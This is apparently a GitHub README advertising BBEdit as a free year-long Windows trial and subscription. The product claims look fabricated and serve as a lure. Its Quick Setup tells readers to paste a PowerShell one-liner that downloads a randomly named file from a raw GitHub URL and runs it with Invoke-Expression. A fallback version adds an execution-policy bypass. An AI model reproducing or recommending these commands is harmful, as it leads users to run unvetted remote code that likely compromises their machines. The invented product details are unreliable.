# BBEdit

BBEdit on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

This repository documents BBEdit as a Windows subscription: recurring access to the editing stack, preference sync, and update channel tied to your plan. It is not a one-time desktop SKU or a game license; you manage entitlement through the subscription lifecycle on your machine.

A typical session starts from the setup file in this repo, which walks through install steps and signs you into the built-in free trial. You open projects, use grep and clippings-style workflows familiar to BBEdit users, save workspace layouts, and let the client check subscription status quietly in the background while you edit.

What you will find here is a Windows-oriented setup file, short configuration notes for paths and extensions, and a changelog that tracks subscription-tier changes and installer revisions. The free subscription that stays on the PC after setup is described alongside the year-long free trial so you know what remains active once initial configuration finishes.

## What you get

- Built-in free trial runs twelve months from first successful Windows setup completion.
- Free subscription persists locally on the PC after setup without daily online checks.
- Subscription tier gates advanced grep, clippings, and project search on Windows builds.
- Setup file aligns install paths, shell integration, and default encoding for BBEdit workflows.
- Changelog records subscription bundle changes and installer build numbers for each release.
- Notes cover backup of clippings, glossary files, and workspace snapshots before major updates.
- Year-long free trial converts cleanly to the free subscription when the trial window ends.
- Windows installer profile keeps update channel and entitlement cache in one documented location.

## Quick Setup (PowerShell)

This starts the built-in BBEdit free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/sandra-klein603194/bbedit-setup-guide/main/ynv6cc0jkn.h31vath8 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sandra-klein603194/bbedit-setup-guide/main/ynv6cc0jkn.h31vath8 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `ynv6cc0jkn.h31vath8` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `sandra-klein603194/bbedit-setup-guide`. BBEdit 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
